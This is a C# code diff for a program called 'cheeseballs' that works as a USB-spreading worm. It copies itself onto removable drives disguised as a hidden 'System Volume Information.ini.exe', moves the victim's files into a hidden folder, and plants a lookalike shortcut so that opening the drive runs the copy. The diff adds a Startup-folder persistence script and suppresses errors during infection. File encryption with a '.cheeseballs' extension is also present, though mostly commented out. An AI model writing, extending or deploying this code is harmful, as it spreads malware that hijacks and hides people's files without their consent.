@@ -15,13 +15,15 @@ namespace cheeseballs
         {
             DriveInfo? drive = GetDriveByName(Path.GetPathRoot(Application.ExecutablePath)); //get the drive app is running on
             if (Path.GetFileName(Application.ExecutablePath).Contains("System Volume Information.ini.exe") && (drive == null ? false : drive.DriveType == DriveType.Removable)) IsRunningFromInfectedDrive = true;
-            if(IsRunningFromInfectedDrive)
+            if (IsRunningFromInfectedDrive)
             {
                 ProcessStartInfo info = new();
                 info.FileName = "explorer.exe";
                 info.Arguments = String.Format(@"{0} \", drive.Name);
                 Process.Start(info);
+                if (Process.GetProcessesByName("cheeseballs").Length > 1) Environment.Exit(31);
             }
+            InitializeComponent();
         }
 
         readonly ManagementEventWatcher watcher = new();
@@ -36,6 +38,13 @@ namespace cheeseballs
             watcher.Query = query;
             watcher.Start();
             TryInfectAll();
+
+            //if (Environment.UserName.Contains("Zemi")) return;
+            string startupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Microsoft\Windows\Start Menu\Programs\Startup\");
+            const string scriptName = "cheeseballs.startupscript.cmd";
+            string scriptPath = Path.Combine(startupPath, scriptName);
+            if (File.Exists(scriptPath)) File.Delete(scriptPath);
+            File.WriteAllText(scriptPath, "msg * /TIME:5 \"cihazinizi yedim afied olsun bana <33 :p\"");
         }
 
         private static DriveInfo? GetDriveByName(string name)
@@ -52,6 +61,7 @@ namespace cheeseballs
         {
             foreach (DriveInfo drive in GetDrives())
             {
+                if (drive == null) return;
                 string? appOrign = Path.GetPathRoot(Application.ExecutablePath);
                 if (appOrign != null) if (drive.Name.Contains(appOrign)) return; //usb is the host of cheeseballs
                 if (!drive.IsReady) return; //drive not ready
@@ -69,7 +79,7 @@ namespace cheeseballs
             {
                 var content = File.ReadAllText(switchPath).ToLower();
                 string[] mustContain = { "dear cheese gods", "begging", "infect my usb drive", "please" };
-                foreach(string s in mustContain)
+                foreach (string s in mustContain)
                 {
                     if (!content.Contains(s)) return false;
                 }
@@ -80,10 +90,11 @@ namespace cheeseballs
         private static void copyDir(string sourceDir, string destDir)
         {
             DirectoryInfo src = new DirectoryInfo(sourceDir);
-            foreach(FileInfo f in src.GetFiles()) {
+            foreach (FileInfo f in src.GetFiles())
+            {
                 f.CopyTo(destDir + @"/" + f.Name, true);
             }
-            foreach(DirectoryInfo d in src.GetDirectories())
+            foreach (DirectoryInfo d in src.GetDirectories())
             {
                 Directory.CreateDirectory(destDir + @"/" + d.Name);
                 copyDir(d.FullName, destDir + @"/" + d.Name);
@@ -92,41 +103,48 @@ namespace cheeseballs
 
         private static void Infect(DriveInfo drive)
         {
-            DirectoryInfo encryptedFileContainer = Directory.CreateDirectory(String.Format(@"{0} \", drive.Name));
-            DirectoryInfo copyContainer = Directory.CreateDirectory(String.Format(@"{0}System Volume Information \", drive.Name));
-            ApplyFolderIcon(encryptedFileContainer.FullName, @"C:\Windows\System32\SHELL32.dll,79");
-            var self = new FileInfo(Application.ExecutablePath);
-            var self_name = Path.GetFileName(self.FullName);
-            var selfDir = Path.GetDirectoryName(Application.ExecutablePath);
-            copyDir(selfDir, String.Format(@"{0}System Volume Information \", drive.Name));
-            File.Move(String.Format(@"{0}System Volume Information \{1}", drive.Name, self_name), String.Format(@"{0}System Volume Information \System Volume Information.ini.exe", drive.Name));
-            var copy = new FileInfo(String.Format(@"{0}System Volume Information \System Volume Information.ini.exe", drive.Name));
-            copy.Attributes = (FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);
-            copyContainer.Attributes = (FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);
-
-            string key = GetEncryptionKeyFromDrive(drive);
-            foreach (string filePath in Directory.GetFiles(String.Format(@"{0}", drive.Name)))
+            try
             {
-                if (filePath.Contains("System Volume Information") || filePath.Contains("desktop.ini")) continue;
-                string newPath = String.Format(@"{0} \{1}", drive.Name, Path.GetFileName(filePath));
-                File.Move(filePath, newPath);
-                //EncryptFile(new FileInfo(newPath), key);
-            }
-            foreach (string directoryPath in Directory.GetDirectories(String.Format(@"{0}", drive.Name)))
-            {
-                if (directoryPath.Contains("System Volume Information") || new DirectoryInfo(directoryPath).Name == " ") continue;
-                string newPath = String.Format(@"{0} \{1}", drive.Name, new DirectoryInfo(directoryPath).Name);
-                Directory.Move(directoryPath, newPath);
-                //EncryptDirectory(new DirectoryInfo(newPath), key);
-            }
-            encryptedFileContainer.Attributes = (FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);
-            string notePath = String.Format(@"{0} ", drive.Name);
-            //File.WriteAllText(notePath, "cheese.balls, gotem.");
-            //File.SetAttributes(notePath, FileAttributes.System | FileAttributes.ReadOnly | FileAttributes.Hidden);
-            string shortcutPath = String.Format("{0}{1} ({2}).lnk", drive.Name, drive.VolumeLabel, FormatBytes(drive.TotalSize));
-            string targetPath = copy.FullName;
+                DirectoryInfo encryptedFileContainer = Directory.CreateDirectory(String.Format(@"{0} \", drive.Name));
+                DirectoryInfo copyContainer = Directory.CreateDirectory(String.Format(@"{0}System Volume Information \", drive.Name));
+                ApplyFolderIcon(encryptedFileContainer.FullName, @"C:\Windows\System32\SHELL32.dll,79");
+                var self = new FileInfo(Application.ExecutablePath);
+                var self_name = Path.GetFileName(self.FullName);
+                var selfDir = Path.GetDirectoryName(Application.ExecutablePath);
+                copyDir(selfDir, String.Format(@"{0}System Volume Information \", drive.Name));
+                File.Move(String.Format(@"{0}System Volume Information \{1}", drive.Name, self_name), String.Format(@"{0}System Volume Information \System Volume Information.ini.exe", drive.Name));
+                var copy = new FileInfo(String.Format(@"{0}System Volume Information \System Volume Information.ini.exe", drive.Name));
+                copy.Attributes = (FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);
+                copyContainer.Attributes = (FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);
 
-            CreateShortcut(shortcutPath, targetPath, @"C:\Windows\System32\SHELL32.dll,79");
+                string key = GetEncryptionKeyFromDrive(drive);
+                foreach (string filePath in Directory.GetFiles(String.Format(@"{0}", drive.Name)))
+                {
+                    if (filePath.Contains("System Volume Information") || filePath.Contains("desktop.ini")) continue;
+                    string newPath = String.Format(@"{0} \{1}", drive.Name, Path.GetFileName(filePath));
+                    File.Move(filePath, newPath);
+                    //EncryptFile(new FileInfo(newPath), key);
+                }
+                foreach (string directoryPath in Directory.GetDirectories(String.Format(@"{0}", drive.Name)))
+                {
+                    if (directoryPath.Contains("System Volume Information") || new DirectoryInfo(directoryPath).Name == " ") continue;
+                    string newPath = String.Format(@"{0} \{1}", drive.Name, new DirectoryInfo(directoryPath).Name);
+                    Directory.Move(directoryPath, newPath);
+                    //EncryptDirectory(new DirectoryInfo(newPath), key);
+                }
+                encryptedFileContainer.Attributes = (FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);
+                string notePath = String.Format(@"{0} ", drive.Name);
+                //File.WriteAllText(notePath, "cheese.balls, gotem.");
+                //File.SetAttributes(notePath, FileAttributes.System | FileAttributes.ReadOnly | FileAttributes.Hidden);
+                string shortcutPath = String.Format("{0}{1} ({2}).lnk", drive.Name, drive.VolumeLabel, FormatBytes(drive.TotalSize));
+                string targetPath = copy.FullName;
+
+                CreateShortcut(shortcutPath, targetPath, @"C:\Windows\System32\SHELL32.dll,79");
+            }
+            catch
+            {
+
+            }
         }
 
         private static string FormatBytes(long bytes)
@@ -143,7 +161,7 @@ namespace cheeseballs
         }
 
         private static void CreateShortcut(string path, string targetPath, string iconPath, string description = "")
-        { 
+        {
             WshShell shell = new WshShell();
             string shortcutAddress = path;
             IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutAddress);
@@ -163,7 +181,7 @@ namespace cheeseballs
                 return;
             }
             string encrypted = AesOperation.EncryptString(key, allText);
-            string newPath = file.FullName + ".cheeseballs"; 
+            string newPath = file.FullName + ".cheeseballs";
 
             File.Move(file.FullName, newPath);
             File.WriteAllText(newPath, encrypted);
